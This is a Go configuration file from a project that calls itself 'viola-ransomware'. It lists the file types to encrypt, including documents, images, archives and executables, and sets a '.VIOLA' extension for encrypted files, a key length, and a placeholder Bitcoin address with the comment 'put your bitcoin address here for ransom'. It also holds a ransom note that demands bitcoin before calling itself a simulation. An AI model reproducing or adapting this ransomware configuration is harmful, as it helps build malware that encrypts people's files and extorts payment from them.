package config

var (
	ExtForEncrypt       = []string{".txt", ".pdf", ".jpg", ".png", ".jpeg", ".webp", ".xlsx", ".docx", ".doc", ".zip", ".exe"} // add if you want
	MaxSize             = 10                                                                                                   // max size read & write file
	BitcoinAddress      = "bc1xxxxxxxx"                                                                                        // put your bitcoin address here for ransom (don't take it seriously)
	AuthorName          = "alf4ridzi"
	GithubLink          = "https://github.com/alf4ridzi/viola-ransomware"
	Version             = 0.1
	ChangedToExtensions = ".VIOLA"
	KeyByte             = 32
	RansomwareMessage   = "Hi, ladies & gentleman. Your important files have been encrypted by Viola-Ransomware.\n\nSend bitcoins to the address %s\nJust kidding. This is just a simulation of ransomware by : https://github.com/alf4ridzi\n\nTo decrypt your data run the program again & choose option number 2 and input the key.txt"
)
